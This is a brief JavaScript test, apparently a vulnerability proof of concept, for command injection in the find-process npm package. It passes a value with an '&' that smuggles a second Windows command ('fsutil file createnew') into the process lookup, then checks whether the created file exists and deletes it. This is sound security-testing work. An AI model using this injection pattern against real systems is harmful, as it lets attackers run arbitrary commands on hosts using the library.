// test("Command Injection in find-process", () => {
//   expect.assertions(1);
  const find = require("find-process");
  const fs = require("fs");
  const path = "./find-process";
  const command = "& fsutil file createnew find-process 0";
  console.log(find("pid", command).then(
    function (list) {
      file_exist = fs.existsSync(path);
      console.log("{ " + file_exist + ", " + true + " }");
      fs.unlink(path, function (err) {});
    },
    function (err) {
//       console.log(err.stack || err);
    }
  ));
// });
